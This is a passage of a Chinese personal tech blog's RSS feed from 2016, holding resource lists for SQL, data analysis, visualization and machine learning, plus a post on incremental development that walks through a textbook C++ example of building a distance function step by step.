&lt;li&gt;edx的log先导入数据库  保留关系 然后变为扁平化数据  &lt;ul&gt;
&lt;li&gt;将log导入数据库是为了获得强大的查询能力  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对sql的使用场景要有所了解  适合作什么&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh/SQLAlchemy"&gt;SQLAlchemy 维基百科&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/0014021031294178f993c85204e4d1b81ab032070641ce5000"&gt;使用SQLAlchemy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://forta.com/books/0672336073/"&gt;SQL必知必会 源码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/e6bba189fcbd"&gt;SQLAlchemy 简单笔记&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 03 May 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-05-03:relational-database-summary.html</guid><category>code</category></item><item><title>数据分析和可视化(我的学习资料)</title><link>/Data-analysis-and-visualization.html</link><description>&lt;p&gt;对数据分析和可视化这块一直兴趣满满，保持关注，搜集了一些不错的资料，整理分享给大家&lt;/p&gt;
&lt;p&gt;语言层面，我主要在关注Python和JavaScript，所以资料可能多与这两门语言有关&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;优秀文章(入门引导)&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/89674/"&gt;The Log：每个程序员都应该知道有关实时数据的统一抽象（1）概念&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.oschina.net/translate/log-what-every-software-engineer-should-know-about-real-time-datas-unifying"&gt;日志：每个软件工程师都应该知道的有关实时数据的统一概念&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/80981/"&gt;数据科学的完整学习路径（Python版）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/81133/"&gt;Python数据分析入门&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/80853/"&gt;Python和数据科学的起步指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;公共数据源&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/caesar0301/awesome-public-datasets"&gt;awesome-public-datasets&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其中我们可以看到香港公开的数据：&lt;a href="https://data.gov.hk/sc"&gt;data.gov.hk&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Python&lt;/h1&gt;
&lt;h3&gt;ipython notebook&lt;/h3&gt;
&lt;p&gt;我喜欢使用ipython notebook（现在改名为jupyter）来探索数据，这是个值得一学的神器，可以看看我此前写的文章：&lt;a href="http://blog.just4fun.site/use-ipython-notebook.html"&gt;使用IPython Notebook来学习编程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用ipython notebook来探索数据有许多好处，其中的一点是可以轻易分享经验和成果，现在有许多教程是基于它的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/DrSkippy/Data-Science-45min-Intros"&gt;Data-Science-45min-Intros&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nbviewer.jupyter.org/github/jrjohansson/scientific-python-lectures/tree/master/"&gt;scientific-python-lectures&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/donnemartin/data-science-ipython-notebooks"&gt;data-science-ipython-notebooks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/donnemartin/interactive-coding-challenges"&gt;interactive-coding-challenges&lt;/a&gt;:这个主要是算法&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/cloga/scipy-lecture-notes_cn"&gt;Pytho科学计算生态的介绍的中文翻译&lt;/a&gt;-&lt;a href="https://github.com/cloga/scipy-lecture-notes_cn"&gt;github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a href="https://github.com/pydata/pandas"&gt;pandas&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jvns/pandas-cookbook"&gt;pandas-cookbook&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nbviewer.jupyter.org/github/jvns/pandas-cookbook/tree/master/cookbook/"&gt;http://nbviewer.jupyter.org/&lt;/a&gt;:从这里快速上手&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/Zhihu_bigdata"&gt;Zhihu_bigdata&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;相关工具&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/robdmc/pandashells"&gt;pandashells&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ipython/ipython/wiki/A-gallery-of-interesting-IPython-Notebooks#pandas-for-data-analysis"&gt;Pandas for data analysis&lt;/a&gt; :ipynb&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pandas-dev/pandas/blob/master/doc/cheatsheet/Pandas_Cheat_Sheet.pdf"&gt;Pandas Cheat Sheet&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;JavaScript&lt;/h1&gt;
&lt;h3&gt;&lt;a href="https://github.com/mbostock/d3"&gt;d3&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/mbostock/d3/wiki/Gallery"&gt;案例展示&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ourd3js.com/wordpress/?cat=2"&gt;D3 入门系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;一些建议：&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/22171866"&gt;学习d3js有没有一个系统的学习方法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/38648735"&gt;如何评价 D3.js这个框架？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/c3800c61d2fb"&gt;D3.js入门指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;在线学习&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/datasciencemasters/go"&gt;The Open Source Data Science Masters&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.dataquest.io/"&gt;dataquest&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;博客&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rushter/data-science-blogs"&gt;data-science-blogs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;真实项目&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rhiever/Data-Analysis-and-Machine-Learning-Projects"&gt;Data-Analysis-and-Machine-Learning-Projects&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;知乎问答&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/29265587"&gt;如何快速成为数据分析师？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;资料集&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/okulbilisim/awesome-datascience"&gt;awesome-datascience&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;一些好书&lt;/h1&gt;
&lt;h3&gt;数据挖掘概念&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://book.douban.com/subject/5377669/"&gt;数据挖掘导论&lt;/a&gt;
&lt;a href="http://book.douban.com/subject/11542972/"&gt;数据挖掘:概念与技术&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;统计学&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/7056708/"&gt;深入浅出统计学&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/10590856/"&gt;统计学习方法&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://book.douban.com/subject/25779298/"&gt;利用Python进行数据分析&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;数据库&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/24250054/"&gt;SQL必知必会&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/3354490/"&gt;MySQL必知必会&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;机器学习&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/3288908/"&gt;集体智慧编程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/24703171/"&gt;机器学习实战&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;其他入门好书&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/6862061/"&gt;计算机科学概论（第11版）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/3040870/"&gt;Head First HTML与CSS、XHTML&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 16 Feb 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-02-16:Data-analysis-and-visualization.html</guid><category>dev-tools</category></item><item><title>机器学习与人工智能(我的学习资料)</title><link>/machine-leanring-and-ai.html</link><description>&lt;h1&gt;我的兴趣点(目前)&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;作诗机&lt;/li&gt;
&lt;li&gt;人工智能&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;策略&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;通过折腾来学习，先把它当做黑盒，关注输入和输出，使用增量法探索，同时阅读统计学和相关工具&lt;/li&gt;
&lt;li&gt;基于ipython notebook来探索&lt;/li&gt;
&lt;li&gt;coursera：&lt;a href="https://www.coursera.org/learn/machine-learning/"&gt;机器学习&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;统计学基础：《深入浅出统计学》&lt;/li&gt;
&lt;li&gt;《神经网络与深度学习讲义》（已粗看一遍）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;入门文章&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/67616/"&gt;有趣的机器学习：最简明入门指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/50338/"&gt;如何向外行解释机器学习和数据挖掘&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.almosthuman.cn/2016/01/23/koarh/"&gt;神经网络和深度学习简史&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;学习路径&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/hangtwenty/dive-into-machine-learning"&gt;dive-into-machine-learning&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a href="https://github.com/scikit-learn/scikit-learn"&gt;scikit-learn&lt;/a&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/81721/"&gt;基于 Python 和 Scikit-Learn 的机器学习介绍&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://segmentfault.com/a/1190000002672062"&gt;机器学习探索之路1：机器学习相关工具介绍与安装&lt;/a&gt;:选择anaconda！&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/gmonce/scikit-learn-book"&gt;scikit-learn-book&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/justmarkham/scikit-learn-videos"&gt;scikit-learn-videos&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.xgezhang.com/scikit_learn_ml_translation.html"&gt;Scikit-Learn机器学习介绍（中文翻译）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://muxuezi.github.io/categories/scikit-learn-cookbook.html"&gt;Posts about scikit-learn cookbook&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;mooc&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.coursera.org/learn/machine-learning/"&gt;机器学习&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;资料集&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ty4z2008/Qix/blob/master/dl.md"&gt;机器学习(Machine Learning)&amp;amp;深度学习(Deep Learning)资料(Chapter 1)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/56256/"&gt;机器学习的最佳入门学习资源&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/73806/"&gt;国外程序员整理的机器学习资源大全&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;知乎问答&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/36768514/answer/81937823"&gt;有没有必要把机器学习算法自己实现一遍？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/22553761"&gt;如何简单形象又有趣地讲解神经网络是什么？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;有趣的项目&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://fuzhii.com/2016/01/16/redmansions/"&gt;用机器学习的方法鉴别红楼梦作者&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/36853910"&gt;GitHub 上有哪些有趣的关于 NLP 或者 DL 的项目&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;图像相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/google/deepdream"&gt;deepdream&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jcjohnson/neural-style"&gt;neural-style&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/alexjc/neural-doodle"&gt;neural-doodle&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;高性能平台&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/tensorflow/tensorflow"&gt;tensorflow&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/aymericdamien/TensorFlow-Examples"&gt;TensorFlow-Examples&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tflearn/tflearn"&gt;tflearn&lt;/a&gt;:Deep learning library featuring a higher-level API for TensorFlow&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jtoy/awesome-tensorflow"&gt;awesome-tensorflow&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tensorflow/skflow"&gt;skflow&lt;/a&gt;:Simplified interface for TensorFlow (mimicking Scikit Learn) for Deep Learning&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Theano/Theano"&gt;Theano&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 16 Feb 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-02-16:machine-leanring-and-ai.html</guid><category>dev-tools</category></item><item><title>关于增量式开发</title><link>/about-incremental-development.html</link><description>&lt;p&gt;增量式开发是我最喜欢的开发方式之一。&lt;/p&gt;
&lt;h2&gt;1&lt;/h2&gt;
&lt;p&gt;在读《The Django Book》时，十分震惊,技术书籍居然可以写得这般清晰，清晰如阳光照射下，清水中的鹅软石。技术类书籍中好书是向来不缺的，对新手友好的书却也并不多见。《The Django Book》算是其一，后来我再翻这本书，想它为何能把知识说得这般清晰，发现书中讲解知识的方式是&lt;code&gt;增量式&lt;/code&gt;的：每次的讲解的内容都尽量做到只包含主题相关部分，基本不添加额外的知识干扰（打击）你，即便有些不可避免的后向引用，也会明确告诉你它的作用是啥，你目前只要把它当成黑盒就行。每一段程序都尽可能简易简短，每一节都在上一节基础上加上一点新东西，这样学起来真如读小说一般连贯有趣。如果哪里不懂，基本可以确定，不懂部分就是这节多出的知识。&lt;/p&gt;
&lt;h2&gt;2&lt;/h2&gt;
&lt;p&gt;《代码大全》里，在谈论隐喻部分时作者说道&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;增量设计 / 构造 / 测试是软件开发的最强有力工具之一&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在增量开发中，你首先设计系统可以运行的最简单版本。它甚至不接受任何数据输入，或者对数据进行处理，他也可以不产生输出。只需要成为一个坚实的骨架结构。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Fred Brooks(《人月神话》作者)甚至认为&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;应做好建造一个扔掉一个的准备&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;3&lt;/h2&gt;
&lt;p&gt;开源社区其实一直挺习惯这种做法的&lt;/p&gt;
&lt;p&gt;《大教堂与集市》中提到&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;优秀的程序员知道写什么，卓越的程序员知道改写（和重用）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;"建设性懒惰”，他们知道人们要的是结果而不是勤奋，而从一个部分可行的方案开始，明显要比从零开始容易得多&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;虽然Linux中所有Minix代码最终都被移除或重写，但它在Linux成长初期确实起到了类似脚手架的作用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上是我做的读书摘记。&lt;/p&gt;
&lt;p&gt;你看，以上谈论的几点，如果你平时都混迹github的话，也许就是这样做的，当有某个需求时，用关键字去github搜下是否有类似项目，有的话，clone下来，以其为脚手架，先跑起来，在此基础上增量地做些自己的定制，如果跑不起来，就checkout回去，成功的话，又继续往前多迈一步，因为使用的是增量式开发，你能知道每次的错误肯定是新增的代码造成的，这样一来你是信心十足的前进，毫无后顾之忧&lt;/p&gt;
&lt;h2&gt;4&lt;/h2&gt;
&lt;p&gt;晚上在翻《How to Think Like a Computer Scientist: C++ version》 （中文版《像计算机科学家一样思考 C++版》）&lt;/p&gt;
&lt;p&gt;第5章谈到程序开发时，作者建议大家使用增量式开发。书中举得一个例子很棒，摘录过来，适合帮助新手理解增量式开发的过程&lt;/p&gt;
&lt;p&gt;我们面临这样一个任务：计算两点（x1,y1）和（x2,y2）之间的距离&lt;/p&gt;
&lt;p&gt;公式是简单的：distance = √((x2-x1)^2+(y2-y1)^2)&lt;/p&gt;
&lt;h3&gt;4.1&lt;/h3&gt;
&lt;p&gt;好的，我们开始写下骨架代码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在这一阶段函数并没有做任何实质性的事情，但是尝试编译可以让我们在把函数变得更复杂之前确认是否却在语法错误。&lt;/p&gt;
&lt;h3&gt;4.2&lt;/h3&gt;
&lt;p&gt;为了测试这个新函数，我们需要调用它&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dist&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;6.0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dict&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;一旦检查完函数定义的语法，就可以开始一次添加一行的代码进行增量开发了。在每次增量改变之后，就可以编译运行程序，用这种方法，在任何一个时间点我们都确切知道错误所在--刚添加的最后一行代码。&lt;/p&gt;
&lt;h3&gt;4.3&lt;/h3&gt;
&lt;p&gt;编译，运行，一切正常。这时你的信心在不断累积。下一步是用两个临时变量dx和dy存储x2-x1和y2-y1的差值&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;dx is &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;dy is &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在此计算distance(1.0, 2.0, 4.0, 6.0)。其中参数的选择是有原因的，水平距离为3，垂直距离为4，所以两点间距离为5，当测试一个函数的时候，知道正确的结果是很有帮助的。在这里dx为3.0，dy为4.0&lt;/p&gt;
&lt;p&gt;编写完函数时，会删除输出语句，像这样的代码称为&lt;code&gt;支架代码&lt;/code&gt;，可以帮助正确地编写程序，但是它并不是最终代码的一部分。&lt;/p&gt;
&lt;h3&gt;4.4&lt;/h3&gt;
&lt;p&gt;下一步是对dx和dy做平方计算，我们使用简单快捷的直接与自身相乘。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dsquared&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
